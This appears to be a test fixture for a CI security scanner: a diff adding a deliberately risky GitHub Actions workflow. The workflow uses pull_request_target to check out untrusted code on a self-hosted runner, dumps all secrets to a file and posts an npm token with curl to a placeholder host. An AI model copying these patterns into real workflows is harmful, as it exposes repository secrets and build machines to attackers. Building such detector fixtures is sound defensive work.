@@ -1,0 +1,19 @@
+name: risky
+on:
+  pull_request_target:
+  discussion:
+jobs:
+  a:
+    runs-on: [self-hosted, linux]
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}
+      - run: echo '${{ toJSON(secrets) }}' > /tmp/s.json
+      - run: curl -d "${{ secrets.NPM_TOKEN }}" https://example.invalid/collect
+  b:
+    runs-on: WORMSIGNTEST
+    steps:
+      - run: ./config.sh --name WORMSIGNTEST
+      # toJSON(secrets) in a comment must not be reported
+      - run: echo "${{ secrets.OK_TOKEN }}" >> "$GITHUB_ENV"
